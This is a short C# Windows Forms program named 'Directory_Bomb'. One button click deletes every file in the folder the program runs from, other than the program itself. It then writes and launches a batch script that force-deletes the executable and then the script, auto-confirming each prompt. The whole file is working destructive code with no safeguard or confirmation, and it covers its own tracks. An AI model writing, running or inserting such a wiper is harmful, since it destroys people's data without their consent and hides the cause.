using System.Diagnostics;

namespace Directory_Bomb.Forms
{
    public partial class BombForm : Form
    {
        public BombForm()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string directory = Directory.GetCurrentDirectory();
            string app_path = Application.ExecutablePath;
            
            foreach(string file in Directory.GetFiles(directory))
            {
                if (file != app_path)
                {
                    File.Delete(file);
                }
            }
            destroy_itself(app_path);
        }

        private void destroy_itself(string path)
        {
            string batchCommands = string.Empty; 

            batchCommands += "@ECHO OFF\n";                      
            batchCommands += "ping -n 3 127.0.0.1 > nul\n";             
            batchCommands += "echo j | del /F ";                    
            batchCommands += path + "\n";
            batchCommands += "echo j | del deleteMyProgram.bat";    

            File.WriteAllText("deleteMyProgram.bat", batchCommands);

            Process.Start("deleteMyProgram.bat");
        }
    }
}
